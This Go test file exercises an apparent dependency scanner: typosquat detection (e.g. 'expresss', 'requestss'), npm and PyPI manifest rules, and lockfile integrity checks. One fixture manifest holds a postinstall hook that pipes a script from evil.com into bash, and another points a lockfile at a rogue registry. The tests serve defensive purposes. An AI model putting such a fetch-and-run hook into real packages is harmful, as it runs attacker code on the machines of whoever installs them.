package checks

import (
	"os"
	"path/filepath"
	"testing"
)

func TestEditDistance(t *testing.T) {
	if d := EditDistance("express", "expres"); d != 1 {
		t.Fatalf("expected 1, got %d", d)
	}
	if d := EditDistance("lodash", "1odash"); d != 1 {
		t.Fatalf("expected 1, got %d", d)
	}
	if d := EditDistance("abc", "abc"); d != 0 {
		t.Fatalf("expected 0, got %d", d)
	}
	if d := EditDistance("", "abc"); d != 3 {
		t.Fatalf("expected 3, got %d", d)
	}
}

func TestIsSuspiciousTyposquat(t *testing.T) {
	if !IsSuspiciousTyposquat("expresss", "npm") {
		t.Fatal("expresss should be flagged as typosquat of express")
	}
	if IsSuspiciousTyposquat("express", "npm") {
		t.Fatal("exact match should not be flagged")
	}
	if IsSuspiciousTyposquat("totally-unique-package-name", "npm") {
		t.Fatal("unrelated name should not be flagged")
	}
}

func TestCheckNPMManifest(t *testing.T) {
	manifest := `{
		"name": "test",
		"dependencies": {
			"expresss": "1.0.0",
			"react": "18.0.0"
		},
		"scripts": {
			"postinstall": "curl https://evil.com/install.sh | bash"
		}
	}`
	findings := CheckNPMManifest([]byte(manifest), "package.json", false)
	ruleIDs := make(map[string]bool)
	for _, f := range findings {
		ruleIDs[f.RuleID] = true
	}
	if !ruleIDs["DEP-002"] {
		t.Error("expected DEP-002 for typosquat 'expresss'")
	}
	if !ruleIDs["DEP-004"] {
		t.Error("expected DEP-004 for suspicious postinstall hook")
	}
}

func TestCheckPyPIManifest(t *testing.T) {
	requirements := "requestss==2.28.0\nnumpy>=1.24\n"
	findings := CheckPyPIManifest([]byte(requirements), "requirements.txt", false)
	found := false
	for _, f := range findings {
		if f.RuleID == "DEP-002" {
			found = true
		}
	}
	if !found {
		t.Error("expected DEP-002 for typosquat 'requestss'")
	}
}

func TestRunDepChecks(t *testing.T) {
	dir := t.TempDir()
	manifest := `{"name":"test","dependencies":{"expresss":"1.0.0"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(manifest), 0o644); err != nil {
		t.Fatal(err)
	}
	findings := RunDepChecks([]string{dir}, false, nil)
	if len(findings) == 0 {
		t.Fatal("expected findings from dependency check")
	}
}

func TestCheckNPMLockfileIntegrity(t *testing.T) {
	tests := []struct {
		name       string
		fileLabel  string
		data       string
		wantRuleID string
		wantNone   bool
	}{
		{
			name:      "not a lockfile",
			fileLabel: "package.json",
			data:      `{}`,
			wantNone:  true,
		},
		{
			name:      "valid lockfile with integrity",
			fileLabel: "package-lock.json",
			data:      `{"packages":{"node_modules/foo":{"resolved":"https://registry.npmjs.org/foo/-/foo-1.0.0.tgz","integrity":"sha512-abc123"}}}`,
			wantNone:  true,
		},
		{
			name:       "missing integrity hash",
			fileLabel:  "package-lock.json",
			data:       `{"packages":{"node_modules/foo":{"resolved":"https://registry.npmjs.org/foo/-/foo-1.0.0.tgz"}}}`,
			wantRuleID: "DEP-LOCK-001",
		},
		{
			name:       "non-default registry",
			fileLabel:  "package-lock.json",
			data:       `{"packages":{"node_modules/bar":{"resolved":"https://evil-registry.com/bar/-/bar-1.0.0.tgz","integrity":"sha512-xyz"}}}`,
			wantRuleID: "DEP-LOCK-002",
		},
		{
			name:       "malformed JSON",
			fileLabel:  "package-lock.json",
			data:       `{not valid json`,
			wantRuleID: "DEP-LOCK-ERR",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := CheckNPMLockfileIntegrity([]byte(tt.data), tt.fileLabel, false)
			if tt.wantNone {
				if len(findings) != 0 {
					t.Errorf("expected no findings, got %d: %v", len(findings), findings)
				}
				return
			}
			found := false
			for _, f := range findings {
				if f.RuleID == tt.wantRuleID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected finding %s, got %v", tt.wantRuleID, findings)
			}
		})
	}
}

func TestCheckMissingLockfile(t *testing.T) {
	t.Run("npm manifest without lockfile", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{}`), 0644); err != nil {
			t.Fatal(err)
		}
		findings := CheckMissingLockfile([]string{dir}, nil)
		found := false
		for _, f := range findings {
			if f.RuleID == "DEP-LOCK-003" {
				found = true
				break
			}
		}
		if !found {
			t.Error("expected DEP-LOCK-003 for npm manifest without lockfile")
		}
	})

	t.Run("python manifest without lockfile", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "pyproject.toml"), []byte(`[build-system]`), 0644); err != nil {
			t.Fatal(err)
		}
		findings := CheckMissingLockfile([]string{dir}, nil)
		found := false
		for _, f := range findings {
			if f.RuleID == "DEP-LOCK-004" {
				found = true
				break
			}
		}
		if !found {
			t.Error("expected DEP-LOCK-004 for python manifest without lockfile")
		}
	})

	t.Run("npm manifest with lockfile present", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{}`), 0644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "package-lock.json"), []byte(`{}`), 0644); err != nil {
			t.Fatal(err)
		}
		findings := CheckMissingLockfile([]string{dir}, nil)
		for _, f := range findings {
			if f.RuleID == "DEP-LOCK-003" {
				t.Error("unexpected DEP-LOCK-003 when lockfile present")
			}
		}
	})

	t.Run("nonexistent root handled gracefully", func(t *testing.T) {
		findings := CheckMissingLockfile([]string{"/nonexistent/path/that/does/not/exist"}, nil)
		foundErr := false
		for _, f := range findings {
			if f.RuleID == "DEP-LOCK-ERR" {
				foundErr = true
				break
			}
		}
		if !foundErr {
			t.Error("expected DEP-LOCK-ERR for nonexistent root")
		}
	})
}
